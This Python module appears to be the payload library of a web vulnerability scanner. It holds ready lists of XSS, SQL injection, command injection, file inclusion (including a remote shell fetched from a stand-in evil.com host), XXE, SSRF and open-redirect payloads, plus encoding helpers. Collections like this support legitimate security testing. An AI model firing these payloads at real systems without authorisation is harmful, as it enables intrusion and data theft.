"""
Payload Generator Utility

This module provides utility functions for generating and managing exploit payloads.
It serves as a centralized payload library that can be used by plugins to retrieve
example payloads for various vulnerability types.
"""

from typing import Dict, List, Optional, Any
import logging

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """
    Centralized payload generator and library for exploit plugins.
    
    This class provides:
    - Pre-defined payload templates for common vulnerability types
    - Payload customization and templating
    - Payload encoding and obfuscation utilities
    - Integration with exploit plugins
    
    Usage:
        generator = PayloadGenerator()
        payloads = generator.get_payloads('sqli', context={'database': 'mysql'})
    """
    
    # XSS Payloads
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"-alert(1)-"',
        "'-alert(1)-'",
        '"><img src=x onerror=alert(1)//',
    ]
    
    # SQL Injection Payloads
    SQLI_PAYLOADS = {
        'basic': [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' OR 'x'='x",
            "') OR ('x')=('x",
        ],
        'mysql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "admin'--",
            "admin' #",
            "admin'/*",
        ],
        'postgresql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT current_database()--",
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--",
        ],
        'mssql': [
            "' UNION SELECT NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT SYSTEM_USER--",
            "' UNION SELECT DB_NAME()--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
        ],
        'oracle': [
            "' UNION SELECT NULL FROM DUAL--",
            "' UNION SELECT banner FROM v$version--",
            "' AND DBMS_LOCK.SLEEP(5)--",
        ],
        'sqlite': [
            "' UNION SELECT sqlite_version()--",
            "' UNION SELECT NULL--",
        ],
    }
    
    # Command Injection Payloads
    RCE_PAYLOADS = [
        '; ls',
        '| ls',
        '& ls',
        '&& ls',
        '; id',
        '| id',
        '& id',
        '&& id',
        '; whoami',
        '| whoami',
        '& whoami',
        '&& whoami',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '$(ls)',
        '`ls`',
        '$(whoami)',
        '`whoami`',
    ]
    
    # Local File Inclusion Payloads
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/proc/self/environ',
        '/proc/self/cmdline',
        'php://filter/convert.base64-encode/resource=index.php',
        'file:///etc/passwd',
    ]
    
    # Remote File Inclusion Payloads
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        'ftp://evil.com/shell.txt',
        '//evil.com/shell.txt',
    ]
    
    # XXE (XML External Entity) Payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    ]
    
    # SSRF (Server-Side Request Forgery) Payloads
    SSRF_PAYLOADS = [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]/',
        'http://0.0.0.0/',
        'http://127.1/',
        'http://2130706433/',  # Decimal IP for 127.0.0.1
        'file:///etc/passwd',
    ]
    
    # Open Redirect Payloads
    OPEN_REDIRECT_PAYLOADS = [
        'http://evil.com',
        'https://evil.com',
        '//evil.com',
        '/\\evil.com',
        '///evil.com',
        '////evil.com',
        'javascript:alert(1)',
    ]
    
    # CSRF Token Bypass Payloads
    CSRF_PAYLOADS = [
        '',  # Empty token
        'invalid_token',
        '0',
        'null',
        'undefined',
    ]
    
    def __init__(self):
        """Initialize the payload generator."""
        self._custom_payloads: Dict[str, List[str]] = {}
    
    def get_payloads(self, vulnerability_type: str, 
                    context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Get payloads for a specific vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability (e.g., 'sqli', 'xss', 'rce')
            context: Optional context for payload customization:
                    - database_type: Database type for SQL injection
                    - target_os: Target OS for RCE payloads
                    - Any other relevant context
        
        Returns:
            List[str]: List of payload strings
        """
        context = context or {}
        
        # Handle SQL injection with database-specific payloads
        if vulnerability_type == 'sqli':
            db_type = context.get('database_type', 'basic')
            if db_type in self.SQLI_PAYLOADS:
                return self.SQLI_PAYLOADS[db_type]
            else:
                # Return basic SQLi payloads if specific DB type not found
                return self.SQLI_PAYLOADS['basic']
        
        # Handle other vulnerability types
        payload_map = {
            'xss': self.XSS_PAYLOADS,
            'rce': self.RCE_PAYLOADS,
            'lfi': self.LFI_PAYLOADS,
            'rfi': self.RFI_PAYLOADS,
            'xxe': self.XXE_PAYLOADS,
            'ssrf': self.SSRF_PAYLOADS,
            'open_redirect': self.OPEN_REDIRECT_PAYLOADS,
            'csrf': self.CSRF_PAYLOADS,
        }
        
        # Check custom payloads first
        if vulnerability_type in self._custom_payloads:
            return self._custom_payloads[vulnerability_type]
        
        # Return built-in payloads
        return payload_map.get(vulnerability_type, [])
    
    def add_custom_payloads(self, vulnerability_type: str, payloads: List[str]) -> None:
        """
        Add custom payloads for a vulnerability type.
        
        Args:
            vulnerability_type: Vulnerability type identifier
            payloads: List of custom payload strings
        """
        if vulnerability_type not in self._custom_payloads:
            self._custom_payloads[vulnerability_type] = []
        
        self._custom_payloads[vulnerability_type].extend(payloads)
        logger.info(
            f"Added {len(payloads)} custom payload(s) for {vulnerability_type}"
        )
    
    def get_all_vulnerability_types(self) -> List[str]:
        """
        Get a list of all supported vulnerability types.
        
        Returns:
            List[str]: List of vulnerability type identifiers
        """
        types = ['xss', 'sqli', 'rce', 'lfi', 'rfi', 'xxe', 'ssrf', 
                'open_redirect', 'csrf']
        types.extend(self._custom_payloads.keys())
        return list(set(types))
    
    def customize_payload(self, payload: str, variables: Dict[str, str]) -> str:
        """
        Customize a payload by replacing variables.
        
        Args:
            payload: Payload template string with {variable} placeholders
            variables: Dictionary of variable name to value mappings
        
        Returns:
            str: Customized payload string
        """
        try:
            return payload.format(**variables)
        except KeyError as e:
            logger.warning(f"Missing variable {e} in payload customization")
            return payload
    
    def encode_payload(self, payload: str, encoding: str = 'url') -> str:
        """
        Encode a payload using the specified encoding.
        
        Args:
            payload: Payload string to encode
            encoding: Encoding type ('url', 'base64', 'html', 'unicode')
        
        Returns:
            str: Encoded payload string
        """
        import urllib.parse
        import base64
        import html
        
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'html':
            return html.escape(payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        else:
            logger.warning(f"Unknown encoding type: {encoding}")
            return payload
    
    def get_payload_info(self, vulnerability_type: str) -> Dict[str, Any]:
        """
        Get information about payloads for a vulnerability type.
        
        Args:
            vulnerability_type: Vulnerability type identifier
        
        Returns:
            Dict containing payload information:
            - count: Number of available payloads
            - types: Sub-types available (e.g., for SQL injection)
            - description: Brief description
        """
        if vulnerability_type == 'sqli':
            return {
                'count': sum(len(v) for v in self.SQLI_PAYLOADS.values()),
                'types': list(self.SQLI_PAYLOADS.keys()),
                'description': 'SQL Injection payloads for multiple database types',
            }
        
        payloads = self.get_payloads(vulnerability_type)
        return {
            'count': len(payloads),
            'types': [],
            'description': f'Payloads for {vulnerability_type} vulnerability type',
        }


# Global singleton instance
_global_generator: Optional[PayloadGenerator] = None


def get_payload_generator() -> PayloadGenerator:
    """
    Get the global payload generator instance.
    
    Returns:
        PayloadGenerator: The global payload generator instance
    """
    global _global_generator
    
    if _global_generator is None:
        _global_generator = PayloadGenerator()
    
    return _global_generator
